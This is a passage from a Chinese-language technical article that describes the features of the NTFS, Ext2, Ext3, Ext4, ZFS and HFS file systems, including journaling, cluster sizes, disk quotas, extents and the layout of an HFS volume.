　　2、NTFS是一个可恢复的文件系统。在NTFS分区上用户很少需要运行磁盘修复程序。NTFS通过使用标准的事物处理日志和恢复技术来保证分区的一致性。发生系统失败事件时，NTFS使用日志文件和检查点信息自动恢复文件系统的一致性。

　　3、NTFS支持对分区、文件夹和文件的压缩。任何基于Windows的应用程序对NTFS分区上的压缩文件进行读写时不需要事先由其他程序进行解压缩，当对文件进行读取时，文件将自动进行解压缩；文件关闭或保存时会自动对文件进行压缩。

　　4、NTFS采用了更小的簇，可以更有效率地管理磁盘空间。在Win 2000的FAT32文件系统的情况下，分区大小在2GB～8GB时簇的大小为4KB；分区大小在8GB～16GB时簇的大小为8KB；分区大小在16GB～32GB时，簇的大小则达到了16KB。而Win 2000的NTFS文件系统，当分区的大小在2GB以下时，簇的大小都比相应的FAT32簇小；当分区的大小在2GB以上时（2GB～2TB），簇的大小都为4KB。相比之下，NTFS可以比FAT32更有效地管理磁盘空间，最大限度地避免了磁盘空间的浪费。

　　5、在NTFS分区上，可以为共享资源、文件夹以及文件设置访问许可权限。许可的设置包括两方面的内容：一是允许哪些组或用户对文件夹、文件和共享资源进行访问；二是获得访问许可的组或用户可以进行什么级别的访问。访问许可权限的设置不但适用于本地计算机的用户，同样也应用于通过网络的共享文件夹对文件进行访问的网络用户。与FAT32文件系统下对文件夹或文件进行访问相比，安全性要高得多。另外，在采用NTFS格式的Win 2000中，应用审核策略可以对文件夹、文件以及活动目录对象进行审核，审核结果记录在安全日志中，通过安全日志就可以查看哪些组或用户对文件夹、文件或活动目录对象进行了什么级别的操作，从而发现系统可能面临的非法访问，通过采取相应的措施，将这种安全隐患减到最低。这些在FAT32文件系统下，是不能实现的。

　　6、在Win 2000的NTFS文件系统下可以进行磁盘配额管理。磁盘配额就是管理员可以为用户所能使用的磁盘空间进行配额限制，每一用户只能使用最大配额范围内的磁盘空间。设置磁盘配额后，可以对每一个用户的磁盘使用情况进行跟踪和控制，通过监测可以标识出超过配额报警阈值和配额限制的用户，从而采取相应的措施。磁盘配额管理功能的提供，使得管理员可以方便合理地为用户分配存储资源，避免由于磁盘空间使用的失控可能造成的系统崩溃，提高了系统的安全性。

　　7、NTFS使用一个“变更”日志来跟踪记录文件所发生的变更。

【Ext2】：

　　Ext2是 GNU/Linux 系统中标准的文件系统，其特点为存取文件的性能极好，对于中小型的文件更显示出优势，这主要得利于其簇快取层的优良设计。

　　其单一文件大小与文件系统本身的容量上限与文件系统本身的簇大小有关，在一般常见的 x86 电脑系统中，簇最大为 4KB，则单一文件大小上限为 2048GB，而文件系统的容量上限为 16384GB。

　　但由于目前核心 2.4 所能使用的单一分割区最大只有 2048GB，实际上能使用的文件系统容量最多也只有 2048GB。

　　至于Ext3文件系统，它属于一种日志文件系统，是对ext2系统的扩展。它兼容ext2，并且从ext2转换成ext3并不复杂。

　　【Ext3】：

　　Ext3是一种日志式文件系统，是对ext2系统的扩展，它兼容ext2。日志式文件系统的优越性在于：由于文件系统都有快取层参与运作，如不使用时必须将文件系统卸下，以便将快取层的资料写回磁盘中。因此每当系统要关机时，必须将其所有的文件系统全部shutdown后才能进行关机。

　　如果在文件系统尚未shutdown前就关机 （如停电） 时，下次重开机后会造成文件系统的资料不一致，故这时必须做文件系统的重整工作，将不一致与错误的地方修复。然而，此一重整的工作是相当耗时的，特别是容量大的文件系统，而且也不能百分之百保证所有的资料都不会流失。

　　为了克服此问题，使用所谓‘日志式文件系统 （Journal File System） ’。此类文件系统最大的特色是，它会将整个磁盘的写入动作完整记录在磁盘的某个区域上，以便有需要时可以回溯追踪。

　　由于资料的写入动作包含许多的细节，像是改变文件标头资料、搜寻磁盘可写入空间、一个个写入资料区段等等，每一个细节进行到一半若被中断，就会造成文件系统的不一致，因而需要重整。

　　然而，在日志式文件系统中，由于详细纪录了每个细节，故当在某个过程中被中断时，系统可以根据这些记录直接回溯并重整被中断的部分，而不必花时间去检查其他的部分，故重整的工作速度相当快，几乎不需要花时间。

　　【Ext4】：

　　Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能：

　　1、与 Ext3 兼容。执行若干条命令，就能从 Ext3 在线迁移到 Ext4，而无须重新格式化磁盘或重新安装系统。原有 Ext3 数据结构照样保留，Ext4 作用于新数据，当然，整个文件系统因此也就获得了 Ext4 所支持的更大容量。

　　2、更大的文件系统和更大的文件。较之 Ext3 目前所支持的最大 16TB 文件系统和最大 2TB 文件，Ext4 分别支持 1EB（1，048，576TB， 1EB=1024PB， 1PB=1024TB）的文件系统，以及 16TB 的文件。

　　3、无限数量的子目录。Ext3 目前只支持 32，000 个子目录，而 Ext4 支持无限数量的子目录。

　　4、Extents。Ext3 采用间接块映射，当操作大文件时，效率极其低下。比如一个 100MB 大小的文件，在 Ext3 中要建立 25，600 个数据块（每个数据块大小为 4KB）的映射表。而 Ext4 引入了现代文件系统中流行的 extents 概念，每个 extent 为一组连续的数据块，上述文件则表示为“该文件数据保存在接下来的 25，600 个数据块中”，提高了不少效率。

　　5、多块分配。当写入数据到 Ext3 文件系统中时，Ext3 的数据块分配器每次只能分配一个 4KB 的块，写一个 100MB 文件就要调用 25，600 次数据块分配器，而 Ext4 的多块分配器“multiblock allocator”（mballoc） 支持一次调用分配多个数据块。

　　6、延迟分配。Ext3 的数据块分配策略是尽快分配，而 Ext4 和其它现代文件操作系统的策略是尽可能地延迟分配，直到文件在 cache 中写完才开始分配数据块并写入磁盘，这样就能优化整个文件的数据块分配，与前两种特性搭配起来可以显著提升性能。

　　7、快速 fsck。以前执行 fsck 第一步就会很慢，因为它要检查所有的 inode，现在 Ext4 给每个组的 inode 表中都添加了一份未使用 inode 的列表，今后 fsck Ext4 文件系统就可以跳过它们而只去检查那些在用的 inode 了。

　　8、日志校验。日志是最常用的部分，也极易导致磁盘硬件故障，而从损坏的日志中恢复数据会导致更多的数据损坏。Ext4 的日志校验功能可以很方便地判断日志数据是否损坏，而且它将 Ext3 的两阶段日志机制合并成一个阶段，在增加安全性的同时提高了性能。

9、“无日志”（No Journaling）模式。日志总归有一些开销，Ext4 允许关闭日志，以便某些有特殊需求的用户可以借此提升性能。

　　10、在线碎片整理。尽管延迟分配、多块分配和 extents 能有效减少文件系统碎片，但碎片还是不可避免会产生。Ext4 支持在线碎片整理，并将提供 e4defrag 工具进行个别文件或整个文件系统的碎片整理。

　　11、inode 相关特性。Ext4 支持更大的 inode，较之 Ext3 默认的 inode 大小 128 字节，Ext4 为了在 inode 中容纳更多的扩展属性（如纳秒时间戳或 inode 版本），默认 inode 大小为 256 字节。Ext4 还支持快速扩展属性（fast extended attributes）和 inode 保留（inodes reservation）。

　　12、持久预分配（Persistent preallocation）。P2P 软件为了保证下载文件有足够的空间存放，常常会预先创建一个与所下载文件大小相同的空文件，以免未来的数小时或数天之内磁盘空间不足导致下载失败。Ext4 在文件系统层面实现了持久预分配并提供相应的 API（libc 中的 posix_fallocate（）），比应用软件自己实现更有效率。

　　13、默认启用 barrier。磁盘上配有内部缓存，以便重新调整批量数据的写操作顺序，优化写入性能，因此文件系统必须在日志数据写入磁盘之后才能写 commit 记录，若 commit 记录写入在先，而日志有可能损坏，那么就会影响数据完整性。Ext4 默认启用 barrier，只有当 barrier 之前的数据全部写入磁盘，才能写 barrier 之后的数据。（可通过 “mount -o barrier=0” 命令禁用该特性。）

　　【ZFS】：

　　ZFS源自于Sun Microsystems为Solaris操作系统开发的文件系统。ZFS是一个具有高存储容量、文件系统与卷管理概念整合、崭新的磁盘逻辑结构的轻量级文件系统，同时也是一个便捷的存储池管理系统。ZFS是一个使用CDDL协议条款授权的开源项目。

　　【HFS】：

　　1、HFS文件系统概念

　　分层文件系统（Hierarchical File System，HFS）是一种由苹果电脑开发，并使用在Mac OS上的文件系统。最初被设计用于软盘和硬盘，同时也可以在在只读媒体如CD-ROM上见到。

　　2、HFS文件系统开发过程

　　HFS首次出现在1985年9月17日，作为Macintosh电脑上新的文件系统。它取代只用于早期Mac型号所使用的平面文件系统Macintosh File System（MFS）。因为Macintosh电脑所产生的数据，比其它通常的文件系统，如DOS使用的FAT或原始Unix文件系统所允许存储的数据更多。苹果电脑开发了一种新式更适用的文件系统，而不是采用现有的规格。例如，HFS允许文件名最多有31个字符的长度，支持metadata和双分支（每个文件的数据和资源支分开存储）文件。

　　尽管HFS象其它大多数文件系统一样被视为专有的格式，因为只有它为大多数最新的操作系统提供了很好的通用解决方法以存取HFS格式磁盘。

　　在1998年，苹果电脑发布了HFS Plus，其改善了HFS对磁盘空间的地址定位效率低下，并加入了其它的改进。当前版本的Mac OS仍旧支持HFS，但从Mac OS X开始HFS卷不能作为启动用。

　　3、构成方式

　　分层文件系统把一个卷分为许多512字节的“逻辑块”。这些逻辑块被编组为“分配块”，这些分配块可以根据卷的尺寸包含一个或多个逻辑块。HFS对地址分配块使用16位数值，分配块的最高限制数量是65536。

　　组成一个HFS卷需要下面的五个结构：

　　1）卷的逻辑块0和1是启动块，它包含了系统启动信息。例如，启动时载入的系统名称和壳（通常是Finder）文件。

　　2）逻辑块2包含主目录块（Master Directory Block，简称MDB）。

　　3）逻辑块3是卷位图（Volume Bitmap）的启动块，它追踪分配块使用状态。

　　4）总目录文件（Catalog File）是一个包含所有文件的记录和储存在卷中目录的B*-tree。

　　5）扩展溢出文件（Extent Overflow File）是当最初总目录文件中三个扩展占用后，另外一个包含额外扩展记录的分配块对应信息的B*-tree。
内核怎样管理你的内存
